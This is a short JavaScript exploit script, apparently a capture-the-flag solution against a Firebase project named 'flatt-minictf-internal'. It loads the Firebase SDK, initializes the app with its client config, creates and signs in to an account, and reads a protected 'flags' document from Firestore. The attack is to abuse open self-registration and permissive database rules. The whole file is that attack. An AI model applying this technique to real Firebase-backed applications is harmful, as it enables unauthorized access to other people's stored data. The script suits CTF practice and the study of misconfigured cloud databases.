(async () => {
  const load = (url) =>
    new Promise((resolve) => {
      const script = document.createElement("script");
      script.setAttribute("src", url);
      script.onload = resolve;
      document.body.appendChild(script);
    });
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-app-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-auth-compat.js");
  await load("https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore-compat.js");
  
  firebase.initializeApp({
    apiKey: "AIzaSyDCCJ2lTAU79fC2URzG8ndw1Ee-4qvO3CM",
    authDomain: "flatt-minictf-internal.firebaseapp.com",
    projectId: "flatt-minictf-internal",
    storageBucket: "flatt-minictf-internal.appspot.com",
    messagingSenderId: "662671516916",
    appId: "1:662671516916:web:8ca0e3a5fd923f4ccaaaa1"
  });

  await firebase.auth().createUserWithEmailAndPassword('exploit@flatt.example.test', 'flattsecurity');
  await firebase.auth().signInWithEmailAndPassword('exploit@flatt.example.test', 'flattsecurity');

  const doc = await firebase.firestore().collection('flags').doc('flag').get();
  console.log(doc.data());
})();
